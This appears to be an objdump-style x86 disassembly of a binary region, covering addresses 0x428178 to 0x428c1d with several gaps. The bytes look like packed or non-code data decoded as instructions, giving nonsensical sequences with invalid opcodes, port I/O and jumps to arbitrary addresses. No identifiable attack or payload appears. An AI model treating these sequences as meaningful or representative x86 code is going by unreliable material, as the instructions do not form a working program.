  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	push   ds
  428181:	or     BYTE PTR [eax+0x1ad0f07],0x0
  428188:	add    eax,0x77000001
  42818d:	out    dx,al
  42818e:	aaa    
  42818f:	fldcw  WORD PTR [ebp-0x5d]
  428192:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428194:	and    cl,dh
  428196:	repz add DWORD PTR [edi],ecx
  428199:	pushf  
  42819a:	sbb    al,0x2b
  42819c:	sti    
  42819d:	and    al,0x40
  42819f:	xor    DWORD PTR [esi-0x6f],edi
  4281a2:	adc    DWORD PTR [ebp-0x6122fa7f],esi
  4281a8:	in     al,dx
  4281a9:	and    eax,DWORD PTR [eax+0x27]
  4281ac:	add    BYTE PTR [ebx-0x7207b54e],0xd8
  4281b3:	add    al,0xb2
  4281b5:	out    dx,al
  4281b6:	mov    WORD PTR [edx+0x15],ss
  4281b9:	std    
  4281ba:	mov    cl,0x74
  4281bc:	dec    ebp
  4281bd:	xchg   DWORD PTR [edx],ebp
  4281bf:	lea    edi,[ecx-0x737a10c9]
  4281c5:	cs dec edx
  4281c7:	cmc    
  4281c8:	mov    bl,0x93
  4281ca:	out    dx,al
  4281cb:	ffreep st(3)
  4281cd:	(bad)  
  4281ce:	call   0xec3c062e
  4281d3:	lds    ebp,FWORD PTR ds:0xa195f465
  4281d9:	enter  0x3978,0x5
  4281dd:	pusha  
  4281de:	mov    ch,0x34
  4281e0:	pop    esi
  4281e1:	inc    edx
  4281e2:	mov    ebp,0xd027312
  4281e7:	test   eax,0x35db8c9e
  4281ec:	mov    ds:0xd1268abe,al
  4281f1:	enter  0x5a29,0x4
  4281f5:	shl    BYTE PTR [esi],0x3d
  4281f8:	cmc    
  4281f9:	mov    ch,0x6a
  4281fb:	push   edi
  4281fc:	in     eax,0x16
  4281fe:	out    0x2a,eax
  428200:	inc    esp
  428201:	mov    DWORD PTR [ebx+0x1680001b],ebp
  428207:	adc    BYTE PTR [edx],bl
  428209:	(bad)  
  42820a:	je     0x4281f5
  42820c:	sar    BYTE PTR ds:0xf1d93446,cl
  428212:	push   es
  428213:	ror    dh,1
  428215:	jp     0x42819a
  428217:	xchg   DWORD PTR [eax+0x4c419c0e],edi
  42821d:	cmp    eax,0x61f80332
  428222:	pop    ecx
  428223:	fcom   DWORD PTR [eax+0x6d69f811]
  428229:	cmc    
  42822a:	jmp    0x61bb9ded
  42822f:	sbb    al,0xd9
  428231:	lds    edi,FWORD PTR [esi]
  428233:	sbb    ebx,DWORD PTR [ebp+0x1f]
  428236:	mov    WORD PTR [edi],?
  428238:	loop   0x4282b8
  42823a:	push   cs
  42823b:	jne    0x4281d8
  42823d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42823e:	mov    al,al
  428240:	pop    ecx
  428241:	adc    BYTE PTR [esi-0x15ff414c],0x90
  428248:	int    0xbf
  42824a:	repz cmp eax,0x18a488e6
  428250:	mov    eax,0xf90b4a7
  428255:	out    dx,eax
  428256:	add    ah,ch
  428258:	cmc    
  428259:	jo     0x42823f
  42825b:	mov    ebx,0xa428ea10
  428260:	mov    ds:0x6eb0412d,eax
  428265:	mov    ecx,0x2517a1be
  42826a:	test   eax,0x59066ca8
  42826f:	sub    eax,0x929f2df0
  428274:	or     al,0x5c
  428276:	add    dl,cl
  428278:	jg     0x4282c0
  42827a:	jnp    0x428294
  42827c:	out    0x2d,al
  42827e:	sbb    DWORD PTR [ebp+0x44],ebx
  428281:	mov    eax,0x7347f2c
  428286:	enter  0x8886,0xe6
  42828a:	dec    edx
  42828b:	pushf  
  42828c:	inc    eax
  42828d:	mov    al,ds:0xafafe7
	...
  4282f2:	add    BYTE PTR [eax],al
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	(bad)  
  428301:	inc    ecx
  428302:	jo     0x42832f
  428304:	adc    al,0xae
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0x51000001
  42830d:	adc    BYTE PTR [edi],cl
  42830f:	or     dh,BYTE PTR [ecx]
  428311:	dec    ecx
  428312:	push   0xbe8d6ec1
  428317:	(bad)  
  428318:	xchg   esi,eax
  428319:	ret    
  42831a:	jnp    0x42834a
  42831c:	adc    BYTE PTR [eax-0x437b3ac7],0xda
  428323:	cs (bad) 
  428325:	scas   eax,DWORD PTR es:[edi]
  428326:	in     al,dx
  428327:	addr16 and dh,dl
  42832a:	pop    esi
  42832b:	sub    ah,BYTE PTR [ebp-0x6a]
  42832e:	shl    edi,0x64
  428331:	cmp    BYTE PTR [ecx],0xbf
  428334:	retf   0xc620
  428337:	pop    eax
  428338:	dec    edx
  428339:	inc    esi
  42833a:	fnstcw WORD PTR [edx-0x7a895fd0]
  428340:	mov    ecx,0x990b06e0
  428345:	pop    ebp
  428346:	pop    ss
  428347:	sbb    DWORD PTR [ebx-0x6c6a3cb2],0xffffffdf
  42834e:	mov    eax,ds:0x96fb7e48
  428353:	cmp    ebp,DWORD PTR ds:0x8e58862a
  428359:	addr16 push esp
  42835b:	out    dx,eax
  42835c:	stc    
  42835d:	mov    al,ds:0x1cb43eec
  428362:	repz ret 
  428364:	test   eax,0xb46b6acb
  428369:	aad    0xc4
  42836b:	les    eax,FWORD PTR [eax-0x1f]
  42836e:	clc    
  42836f:	xchg   ebx,eax
  428370:	sbb    eax,0x302f142
  428375:	add    esi,DWORD PTR [ecx]
  428377:	xchg   ebx,eax
  428378:	sbb    BYTE PTR [ebp+0x51],al
  42837b:	mov    ds:0xfbdf5043,al
  428380:	pop    edx
  428381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428382:	or     cl,BYTE PTR [eax+0x7f]
  428385:	out    dx,al
  428386:	in     eax,0x4c
  428388:	sbb    al,0x97
  42838a:	clc    
  42838b:	mov    eax,0x8073a871
  428390:	push   ss
  428391:	ins    BYTE PTR es:[edi],dx
  428392:	mov    dh,0xea
  428394:	sub    edx,DWORD PTR [ecx+eax*4-0x7abaaf93]
  42839b:	aam    0x11
  42839d:	xchg   esi,eax
  42839e:	mov    esi,0x71c08fbe
  4283a3:	xor    al,0x85
  4283a5:	mul    esp
  4283a7:	enter  0x254c,0x94
  4283ab:	out    dx,eax
  4283ac:	scas   eax,DWORD PTR es:[edi]
  4283ad:	pop    es
  4283ae:	fwait
  4283af:	xchg   ecx,eax
  4283b0:	repz and DWORD PTR [eax],ecx
  4283b3:	cwde   
  4283b4:	push   esp
  4283b5:	cli    
  4283b6:	enter  0xbce5,0xb7
  4283ba:	icebp  
  4283bb:	mov    bh,0x1d
  4283bd:	mov    ah,0x83
  4283bf:	sahf   
  4283c0:	xchg   edi,eax
  4283c1:	es es pop esp
  4283c4:	mov    ah,0x63
  4283c6:	shl    BYTE PTR [ecx],0x7f
  4283c9:	dec    edx
  4283ca:	stc    
  4283cb:	test   al,0x55
  4283cd:	daa    
  4283ce:	xor    edi,DWORD PTR [edi-0x288882dc]
  4283d4:	xchg   ebp,eax
  4283d5:	sbb    ah,BYTE PTR [esi]
  4283d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283d8:	push   es
  4283d9:	(bad)  
  4283da:	mov    ch,0x8d
  4283dc:	sub    DWORD PTR ds:0x66c33e5f,esp
  4283e2:	jl     0x428453
  4283e4:	inc    edi
  4283e5:	xchg   edx,eax
  4283e6:	cld    
  4283e7:	ror    ch,1
  4283e9:	jmp    0xc8ca9c0e
  4283ee:	mov    bl,0x2d
  4283f0:	xor    al,0x86
  4283f2:	(bad)  
  4283f3:	sti    
  4283f4:	ret    
  4283f5:	push   ds
  4283f6:	adc    ebp,esp
  4283f8:	push   cs
  4283f9:	ja     0x428386
  4283fb:	js     0x428448
  4283fd:	imul   eax,DWORD PTR [eax+0x47],0xffffff8c
  428401:	mov    ds:0x411cbf25,eax
  428406:	stos   DWORD PTR es:[edi],eax
  428407:	xchg   ebx,edx
  428409:	shl    DWORD PTR [eax-0x7e],cl
  42840c:	xchg   ebx,eax
  42840d:	push   eax
  42840e:	mov    edi,0xdf8
	...
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x1eabfb32
  428481:	cmp    eax,0xaf1961ec
  428486:	add    DWORD PTR [eax],eax
  428488:	add    eax,0xa5000001
  42848d:	xor    bh,BYTE PTR [edi-0x73]
  428490:	(bad)  
  428491:	adc    ebx,ebp
  428493:	popa   
  428494:	aad    0x2f
  428496:	in     eax,0xc9
  428498:	retf   0x768b
  42849b:	inc    esi
  42849c:	fwait
  42849d:	nop
  42849e:	test   DWORD PTR [ebx],0xb144ef80
  4284a4:	push   ebp
  4284a5:	test   eax,0xcb283ac6
  4284aa:	ret    0xacc6
  4284ad:	xchg   edx,eax
  4284ae:	push   cs
  4284af:	inc    edx
  4284b0:	or     al,0x19
  4284b2:	and    BYTE PTR [ebx-0x1f],bh
  4284b5:	adc    eax,0xb7ba0621
  4284ba:	out    dx,eax
  4284bb:	sbb    dl,dh
  4284bd:	pop    ebp
  4284be:	test   eax,0xa5b2e4c7
  4284c3:	push   ebp
  4284c4:	sbb    BYTE PTR [ebx],ah
  4284c6:	adc    bh,BYTE PTR [eax]
  4284c8:	sbb    BYTE PTR [ecx],bl
  4284ca:	and    bh,dh
  4284cc:	sub    DWORD PTR [esi+esi*4+0x14871619],eax
  4284d3:	test   edi,ebp
  4284d5:	mov    ch,0x4d
  4284d7:	push   edi
  4284d8:	int3   
  4284d9:	inc    esp
  4284da:	sbb    eax,0xfce2b6fd
  4284df:	push   ss
  4284e0:	jae    0x42848c
  4284e2:	add    eax,0xcdf3dfd3
  4284e7:	sub    DWORD PTR [ecx+edx*8-0x19bb000d],eax
  4284ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284ef:	in     al,0x6e
  4284f1:	sbb    eax,0xeb909fc3
  4284f6:	jo     0x428515
  4284f8:	mov    ah,BYTE PTR [edx+0x52]
  4284fb:	inc    bp
  4284fd:	push   ebp
  4284fe:	mov    edi,0x456183d7
  428503:	call   FWORD PTR [ebx]
  428505:	mov    al,0xb4
  428507:	sbb    edx,DWORD PTR [bx+0x10]
  42850b:	sbb    eax,0x70e25080
  428510:	sbb    ecx,DWORD PTR [edi-0x7248e568]
  428516:	in     eax,dx
  428517:	sub    edx,DWORD PTR [eax-0x6268f64]
  42851d:	idiv   BYTE PTR [esi+0x47852a58]
  428523:	add    eax,0x2b18dfaa
  428528:	paddsw mm3,QWORD PTR ds:0xee22f606
  42852f:	frstor [ebx-0x52]
  428532:	mov    ecx,0xbc52fd4c
  428537:	sbb    eax,0xd599445f
  42853c:	ds sbb al,0x4d
  42853f:	and    bh,ah
  428541:	lods   al,BYTE PTR ds:[esi]
  428542:	push   es
  428543:	fs push esp
  428545:	iret   
  428546:	test   eax,0x47a2105e
  42854b:	adc    DWORD PTR [ecx-0x6351d7eb],ebx
  428551:	adc    DWORD PTR [ecx-0x4820c20e],ebx
  428557:	mov    ds:0xde308b1f,al
  42855c:	loope  0x4285bd
  42855e:	dec    esp
  42855f:	sbb    al,0xbb
  428561:	inc    ecx
  428562:	ror    DWORD PTR [esi],0x52
  428565:	mov    cl,0x7b
  428567:	mov    esp,0xc8118446
  42856c:	mov    eax,ds:0xa40d8b44
  428571:	and    DWORD PTR [eax-0x43a7dc6],ecx
  428577:	fild   DWORD PTR [edx]
  428579:	mov    ah,0xcc
  42857b:	stc    
  42857c:	fadd   DWORD PTR [edx+edx*4+0x5a680ec7]
  428583:	cmp    ebx,ebp
  428585:	dec    edi
  428586:	mov    DWORD PTR [edx-0x22],esp
  428589:	jl     0x428547
  42858b:	dec    ebx
  42858c:	js     0x4285cc
  42858e:	cmp    ebp,ecx
  428590:	adc    DWORD PTR [eax],eax
	...
  4285f2:	add    BYTE PTR [eax],al
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x47b1a3f6
  428602:	gs gs push ds
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x54000001,al
  42860d:	fs cwde 
  42860f:	or     eax,DWORD PTR [ecx+0x3d]
  428612:	shl    DWORD PTR [esp+ebx*4-0x3b],cl
  428616:	rol    dh,0xf4
  428619:	xchg   BYTE PTR [edi+0x16],ah
  42861c:	cmp    al,0xa0
  42861e:	cmp    DWORD PTR [edi+0x4c408ef1],ebp
  428624:	jecxz  0x428603
  428626:	sub    al,0xe
  428628:	jb     0x428639
  42862a:	inc    edx
  42862b:	xchg   BYTE PTR [ecx-0x45],al
  42862e:	bound  esi,QWORD PTR [ecx+eiz*2-0x20b7b392]
  428635:	jne    0x4285d8
  428637:	fisubr WORD PTR [edx+0x3430474f]
  42863d:	daa    
  42863e:	ror    BYTE PTR [edx],1
  428640:	pop    DWORD PTR [ecx+0x6f]
  428643:	jae    0x4286b7
  428645:	jl     0x428670
  428647:	xchg   cl,bl
  428649:	fadd   QWORD PTR [ecx-0x37a4b94e]
  42864f:	rol    DWORD PTR [ebp-0x3c73ec3e],0x9
  428656:	push   ebp
  428657:	fistp  QWORD PTR [eax]
  428659:	pusha  
  42865a:	lods   eax,DWORD PTR ds:[esi]
  42865b:	pop    edi
  42865c:	push   eax
  42865d:	div    DWORD PTR [edi+0x2a]
  428660:	sbb    BYTE PTR [edi],bl
  428662:	xor    eax,DWORD PTR [edx-0x5c]
  428665:	(bad)  
  428666:	dec    ebx
  428667:	mov    BYTE PTR ds:0xb87b1f82,dh
  42866d:	clc    
  42866e:	pop    esi
  42866f:	mov    bl,0x7a
  428671:	xlat   BYTE PTR ds:[ebx]
  428672:	or     BYTE PTR [edx+0x5f],al
  428675:	cmp    BYTE PTR [si+0x57],dl
  428679:	ror    ch,1
  42867b:	in     al,dx
  42867c:	repz shr DWORD PTR [esi],1
  42867f:	mov    ?,WORD PTR [esi+0x52665397]
  428685:	aam    0x1b
  428687:	ins    DWORD PTR es:[edi],dx
  428688:	mov    edi,0x50b6da38
  42868d:	out    0x6e,eax
  42868f:	shr    DWORD PTR [ebp+0x3cf0ba27],0xdb
  428696:	pop    esi
  428697:	cmp    DWORD PTR [edx],edx
  428699:	test   esi,esp
  42869b:	out    dx,al
  42869c:	mov    DWORD PTR [ebp-0x667cb2bb],ebp
  4286a2:	inc    eax
  4286a3:	call   0x957bb2af
  4286a8:	stc    
  4286a9:	or     al,0x64
  4286ab:	sbb    ch,ah
  4286ad:	jns    0x42868e
  4286af:	les    ebx,FWORD PTR ds:0x38ccac92
  4286b5:	jmp    0x9c22:0xe37336f
  4286bc:	jns    0x4286e5
  4286be:	mov    al,0x3
  4286c0:	jge    0x428661
  4286c2:	push   edx
  4286c3:	cmp    bl,BYTE PTR [ebp+0x4f4ce0b2]
  4286c9:	dec    edx
  4286ca:	loop   0x42873a
  4286cc:	mov    edi,0xcb330be0
  4286d1:	cs push 0xd7902fe1
  4286d7:	leave  
  4286d8:	fs aad 0x6a
  4286db:	push   es
  4286dc:	inc    esi
  4286dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286de:	adc    eax,0x2276af05
  4286e3:	in     eax,0xb7
  4286e5:	retf   
  4286e6:	inc    ebx
  4286e7:	clc    
  4286e8:	iret   
  4286e9:	in     al,0xe7
  4286eb:	pop    edx
  4286ec:	mov    edi,0xb11b64cd
  4286f1:	jecxz  0x42875f
  4286f3:	test   BYTE PTR [ebx-0x1b],bl
  4286f6:	mov    ecx,0x96ffbc0d
  4286fb:	xchg   ebp,eax
  4286fc:	or     eax,0x5858bad0
  428701:	ror    ebx,0xf8
  428704:	add    DWORD PTR [ebx-0x66e0445b],ebp
  42870a:	inc    eax
  42870b:	pop    esp
  42870c:	addr16 clc 
  42870e:	or     ch,dl
  428710:	test   al,0x0
	...
  428772:	add    BYTE PTR [eax],al
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0xdb162596
  428783:	hlt    
  428784:	and    esi,DWORD PTR [ecx+0x1050001]
  42878a:	add    BYTE PTR [eax],al
  42878c:	bound  esp,QWORD PTR [ebx+0x2b]
  42878f:	js     0x428755
  428791:	fstp   DWORD PTR [esi+0x5b63fbd]
  428797:	clc    
  428798:	jp     0x428743
  42879a:	lods   al,BYTE PTR ds:[esi]
  42879b:	mov    dl,0x9
  42879d:	sbb    BYTE PTR [ebp-0x3a],dh
  4287a0:	push   edi
  4287a1:	mov    eax,0x7060dce7
  4287a6:	and    BYTE PTR [ebx-0x695de9de],0x82
  4287ad:	sbb    eax,0x12fb046d
  4287b2:	ins    BYTE PTR es:[edi],dx
  4287b3:	jl     0x42879d
  4287b5:	fdiv   DWORD PTR [ebx+eax*4-0x3c]
  4287b9:	jbe    0x428788
  4287bb:	dec    edx
  4287bc:	stos   BYTE PTR es:[edi],al
  4287bd:	jmp    0xf53ff319
  4287c2:	ss sti 
  4287c4:	sbb    ecx,DWORD PTR [edx+0xf4165fc]
  4287ca:	inc    edi
  4287cb:	lock jae 0x4287d5
  4287ce:	(bad)  
  4287cf:	cmp    al,0x74
  4287d1:	or     BYTE PTR [edx-0x57],0x7f
  4287d5:	and    al,BYTE PTR [esp+edx*8+0x1b5fe1d7]
  4287dc:	icebp  
  4287dd:	nop
  4287de:	(bad)  
  4287df:	rol    DWORD PTR [eax+0x1cf2a562],cl
  4287e5:	pusha  
  4287e6:	push   esp
  4287e7:	pop    esi
  4287e8:	stc    
  4287e9:	mov    eax,0xeac4a923
  4287ee:	(bad)  
  4287f0:	retf   0x30fb
  4287f3:	mov    ecx,0xb62a0fa6
  4287f8:	mov    BYTE PTR [eax+ebp*1],ah
  4287fb:	sub    eax,0xd5d78a34
  428800:	add    BYTE PTR [edx+0x1603c8a3],bh
  428806:	mov    ds:0x42b3462a,eax
  42880b:	mov    fs,ecx
  42880d:	jl     0x4287ea
  42880f:	mov    esi,0xa897fdd5
  428814:	ins    BYTE PTR es:[edi],dx
  428815:	int    0xd
  428817:	ss dec ecx
  428819:	push   ebx
  42881a:	push   eax
  42881b:	pop    ss
  42881c:	mov    eax,ds:0x84d398d8
  428821:	lods   al,BYTE PTR ds:[esi]
  428822:	xor    bh,bl
  428824:	cmp    ebp,ecx
  428826:	shl    eax,1
  428828:	outs   dx,DWORD PTR ds:[esi]
  428829:	sbb    eax,0x93df4ddc
  42882e:	or     bh,BYTE PTR [esi+0x47]
  428831:	xor    DWORD PTR [edx+eiz*2-0x60e9b4d9],ebp
  428838:	sub    eax,0x10007eb5
  42883d:	stos   BYTE PTR es:[edi],al
  42883e:	(bad)  
  42883f:	call   0x8e2c:0xd4fe88b5
  428846:	lods   al,BYTE PTR ds:[esi]
  428847:	cdq    
  428848:	push   edi
  428849:	dec    ebx
  42884a:	dec    ecx
  42884b:	xchg   edx,eax
  42884c:	stc    
  42884d:	inc    eax
  42884e:	fstp   QWORD PTR [esi+0x33]
  428851:	push   es
  428852:	stos   DWORD PTR es:[edi],eax
  428853:	shl    bh,0xef
  428856:	les    ax,DWORD PTR [edx-0x7e]
  42885a:	pop    eax
  42885b:	or     eax,0xac335f4d
  428860:	out    dx,eax
  428861:	inc    ebp
  428862:	inc    esp
  428863:	scas   eax,DWORD PTR es:[edi]
  428864:	pop    ds
  428865:	and    DWORD PTR [edx-0x3e60f6d1],0xffffff8a
  42886c:	mov    al,0xcb
  42886e:	jno    0x42883c
  428870:	mov    esi,0xf15be117
  428875:	aas    
  428876:	loopne 0x428881
  428878:	data16 (bad) 
  42887a:	mov    esp,0xbf2b611c
  42887f:	jae    0x4288f7
  428881:	loope  0x4288bb
  428883:	adc    dh,cl
  428885:	mul    BYTE PTR [esi-0x50]
  428888:	or     dh,0xaa
  42888b:	outs   dx,DWORD PTR ds:[esi]
  42888c:	pop    ss
  42888d:	es std 
  42888f:	adc    al,0x5a
	...
  4288f1:	add    BYTE PTR [eax],al
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0xc2362f1],bx
  428902:	addr16 adc al,0x28
  428905:	mov    dl,0x1
  428907:	add    BYTE PTR ds:0x31000001,al
  42890d:	inc    edi
  42890e:	pushf  
  42890f:	shr    BYTE PTR [esi],cl
  428911:	cmc    
  428912:	ds cmc 
  428914:	and    BYTE PTR [edi+0x6],cl
  428917:	push   es
  428918:	add    al,0x2e
  42891a:	mov    al,0x4b
  42891c:	add    al,0x35
  42891e:	mov    cl,0x7f
  428920:	mov    ds:0xbc84830e,al
  428925:	xchg   esi,eax
  428926:	push   edi
  428927:	mov    edi,0x86d0e3b1
  42892c:	stos   DWORD PTR es:[edi],eax
  42892d:	rcl    BYTE PTR [ecx-0x7b06195f],0x82
  428934:	cmp    DWORD PTR [ebx+0x5ab3aa8c],ecx
  42893a:	or     DWORD PTR [esi-0x59],ecx
  42893d:	pop    ss
  42893e:	loop   0x42895e
  428940:	std    
  428941:	in     eax,dx
  428942:	adc    BYTE PTR [eax+edi*4],ch
  428945:	repnz imul DWORD PTR [ecx-0x68]
  428949:	push   esp
  42894a:	jmp    0x531d8913
  42894f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428950:	sbb    eax,0xda52b32a
  428955:	aad    0xbe
  428957:	add    DWORD PTR [esi],ebx
  428959:	out    dx,al
  42895a:	js     0x428951
  42895c:	jno    0x428900
  42895e:	jmp    0x5ff7:0x6c154c45
  428965:	mov    al,ds:0xaf08fee9
  42896a:	xor    al,BYTE PTR [edi-0x8364de5]
  428970:	rcl    edx,0x61
  428973:	ss in  al,dx
  428975:	jp     0x4289d2
  428977:	add    bh,dh
  428979:	cmp    ebx,DWORD PTR [ebp+0x12]
  42897c:	rcl    BYTE PTR [edx+edx*4-0x24],0xdb
  428981:	not    DWORD PTR [ebx-0xc]
  428984:	mov    eax,0x8f9fdbc1
  428989:	stos   DWORD PTR es:[edi],eax
  42898a:	jg     0x42899f
  42898c:	daa    
  42898d:	pushf  
  42898e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42898f:	sub    bh,cl
  428991:	shl    BYTE PTR [ebp-0x14],0xbf
  428995:	lea    esi,[esi]
  428997:	pop    esp
  428998:	jno    0x4289d2
  42899a:	in     eax,dx
  42899b:	icebp  
  42899c:	stc    
  42899d:	mov    ecx,ecx
  42899f:	push   esp
  4289a0:	mov    bh,0xe3
  4289a2:	imul   esp,DWORD PTR [edi+0x40],0xf2a39528
  4289a9:	push   ecx
  4289aa:	push   ds
  4289ab:	retf   0x5894
  4289ae:	jo     0x42898f
  4289b0:	sbb    dl,al
  4289b2:	imul   ebx,DWORD PTR [ebx],0x80aaa5c7
  4289b8:	sub    edi,esp
  4289ba:	or     BYTE PTR [ebp-0x17],ch
  4289bd:	add    BYTE PTR [esi],bh
  4289bf:	mov    dh,0x94
  4289c1:	das    
  4289c2:	xchg   ebp,eax
  4289c3:	mov    al,ds:0x272f4fd6
  4289c8:	inc    eax
  4289c9:	in     al,dx
  4289ca:	push   ecx
  4289cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289cc:	pop    edi
  4289cd:	lods   eax,DWORD PTR ds:[esi]
  4289ce:	cli    
  4289cf:	mov    cl,0x23
  4289d1:	lods   eax,DWORD PTR ds:[esi]
  4289d2:	and    dh,dl
  4289d4:	rol    edx,1
  4289d6:	xchg   DWORD PTR [ebx+ebp*8+0x64336b54],ebp
  4289dd:	jl     0x4289cb
  4289df:	add    al,0x77
  4289e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4289e2:	mov    bh,0xe4
  4289e4:	push   ds
  4289e5:	sti    
  4289e6:	aaa    
  4289e7:	sti    
  4289e8:	lea    esp,[ecx-0x7950fd23]
  4289ee:	pop    es
  4289ef:	adc    BYTE PTR [edx-0x14],dl
  4289f2:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4289f4:	xor    eax,0x5c5587fa
  4289f9:	cmc    
  4289fa:	or     dh,BYTE PTR [edx-0x6]
  4289fd:	xor    ecx,0x1661f2a
  428a03:	or     DWORD PTR ss:[edx-0x69],0x6cfcee13
  428a0b:	adc    ebp,esi
  428a0d:	shl    DWORD PTR fs:[eax+0x60],cl
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x24b99413]
  428a83:	lahf   
  428a84:	sub    eax,0x50001b3
  428a89:	add    DWORD PTR [eax],eax
  428a8b:	add    BYTE PTR [ecx+0x4a],ch
  428a8e:	out    0xd,al
  428a90:	les    ecx,FWORD PTR [esi+0x6292d4f7]
  428a96:	bound  ebx,QWORD PTR [ebx]
  428a98:	dec    bl
  428a9a:	pop    eax
  428a9b:	mov    esp,0xbe3fa6f8
  428aa0:	fimul  DWORD PTR [esp+ebp*8]
  428aa3:	dec    ebx
  428aa4:	xor    cl,al
  428aa6:	mov    dh,0x57
  428aa8:	and    BYTE PTR [ebx],bh
  428aaa:	push   edi
  428aab:	and    BYTE PTR [ecx+0x7d],dl
  428aae:	(bad)  
  428ab0:	mov    bl,0x8b
  428ab2:	lea    edx,[esi+0x3579496]
  428ab8:	mov    esp,0xdf63b4e2
  428abd:	pop    ds
  428abe:	pop    esi
  428abf:	pop    ds
  428ac0:	jo     0x428a8f
  428ac2:	pop    ecx
  428ac3:	je     0x428a9c
  428ac5:	mov    al,ds:0x59ab34d4
  428aca:	cdq    
  428acb:	push   edx
  428acc:	jmp    0x428aa5
  428ace:	sbb    edx,DWORD PTR [eax+0x2b]
  428ad1:	add    ch,BYTE PTR [ecx+0x1a60ae7d]
  428ad7:	mov    WORD PTR [ebp+0x332493ce],?
  428add:	mul    DWORD PTR [edi+0x151d930e]
  428ae3:	xor    eax,0x44fd0f40
  428ae8:	xchg   esi,eax
  428ae9:	ss pop ebx
  428aeb:	div    BYTE PTR [ecx]
  428aed:	test   eax,0xdce293e7
  428af2:	mov    ebp,0x71fec26c
  428af7:	adc    eax,0xdf30251e
  428afc:	sahf   
  428afd:	in     eax,0x8
  428aff:	retf   
  428b00:	inc    ebx
  428b01:	add    eax,0x4ecf9c8f
  428b06:	fidiv  WORD PTR ds:0x864da695
  428b0c:	inc    edi
  428b0d:	repnz sbb cl,BYTE PTR [edx-0x6555cd35]
  428b14:	mov    bl,0xfc
  428b16:	ret    0xd0
  428b19:	push   0xef622215
  428b1e:	and    edx,ecx
  428b20:	scas   eax,DWORD PTR es:[edi]
  428b21:	and    al,0xd
  428b23:	stos   BYTE PTR es:[edi],al
  428b24:	sbb    edi,DWORD PTR [eax]
  428b26:	(bad)  
  428b27:	cmp    bl,bh
  428b29:	inc    esp
  428b2a:	xchg   ecx,eax
  428b2b:	lds    ebp,FWORD PTR [esi-0x1b]
  428b2e:	or     BYTE PTR [ecx-0x67b478f2],bl
  428b34:	adc    BYTE PTR [ebx+esi*1+0x4f],dl
  428b38:	lods   eax,DWORD PTR ds:[esi]
  428b39:	adc    dh,al
  428b3b:	jge    0x428aec
  428b3d:	sti    
  428b3e:	mov    BYTE PTR [ecx+eiz*4],dl
  428b41:	cmc    
  428b42:	sbb    DWORD PTR [esi+0x5fdc3a23],ecx
  428b48:	jo     0x428b86
  428b4a:	cmp    eax,0xf1129e17
  428b4f:	pusha  
  428b50:	cmp    DWORD PTR [ebx+0x4b61756f],esi
  428b56:	(bad)  
  428b57:	xchg   esp,eax
  428b58:	rol    BYTE PTR [ebx-0x4c],0x8f
  428b5c:	scas   al,BYTE PTR es:[edi]
  428b5d:	loopne 0x428bdd
  428b5f:	cmp    BYTE PTR [ecx+0x69],0x64
  428b63:	mov    esp,0x5e08b605
  428b68:	test   BYTE PTR [ebx+0x33],bh
  428b6b:	cmp    DWORD PTR [edi+0x62],ecx
  428b6e:	outs   dx,BYTE PTR ds:[esi]
  428b6f:	cmp    DWORD PTR [edx+0x4a9d3bfb],0xffffffd8
  428b76:	cs repz out dx,al
  428b79:	push   ebx
  428b7a:	outs   dx,BYTE PTR ds:[esi]
  428b7b:	push   ecx
  428b7c:	cmp    BYTE PTR [ebx],al
  428b7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b7f:	xchg   esi,eax
  428b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b81:	xor    DWORD PTR [ecx+0x5e],edx
  428b84:	sbb    DWORD PTR [ebx-0x62674c91],edx
  428b8a:	jp     0x428bd1
  428b8c:	jp     0x428b88
  428b8e:	fcom   QWORD PTR [edx+0x35]
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x39f0bc36
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [ebx+0x4d226885],cl
  428c11:	scas   eax,DWORD PTR es:[edi]
  428c12:	dec    edx
  428c13:	mov    DWORD PTR [edx-0x1],esi
  428c16:	inc    ecx
  428c17:	xchg   esp,eax
  428c18:	add    eax,0x8fcab5a5
  428c1d:	ja     0x428c5b
